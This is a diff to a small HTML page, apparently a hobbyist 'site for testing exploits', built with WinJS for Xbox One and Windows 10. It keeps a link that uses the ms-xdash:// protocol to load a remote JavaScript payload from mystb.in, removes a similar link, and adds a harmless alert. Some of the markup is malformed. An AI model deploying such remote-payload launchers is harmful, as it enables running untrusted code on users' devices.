@@ -1,10 +1,10 @@
+<body onload="runwin()">
 <!-- PAGE_LOAD -->
 <!-- WinJS references -->
 <link href="/WinJS/css/ui-dark.css" rel="stylesheet" />
 <script src="/WinJS/js/base.min.js"></script>
 <script src="/WinJS/js/ui.min.js"></script>
 <!-- WinJS references -->
-<body onload="runwin()"></body>
 <script>
   function runwin() {
      "use strict";
@@ -15,10 +15,11 @@
 
 <!-- Start Of File -->
 <strong>A site for testing exploits I find!</strong>
-<button id="btn_submit" data-win-control="WinJS.UI.Tooltip" data-win-options="{innerHTML: 'TestButton'}"></button>
+<button id="btn_submit" data-win-control="WinJS.UI.Tooltip" data-win-options="{innerHTML: 'TestButton'}">Hover Over Me?</button>
 <!-- XOne Exploits -->
 <br><a type="text/javascript" onclick="ms-xdash://?payload=https://mystb.in/raw/BodiesMallSurrounded.javascript" ;>Test 1 (XBOX ONLY)</a><br>
 
 
 <!-- Other Exploits -->
-<br><a type="text/javascript" onclick="https://mystb.in/raw/BodiesMallSurrounded.javascript" ;>Test 1 (XBOX ONLY)</a><br>
+<br><a onclick="alert('NO')" ;>Test 2 (WIN10 ONLY)</a><br>
+</body>
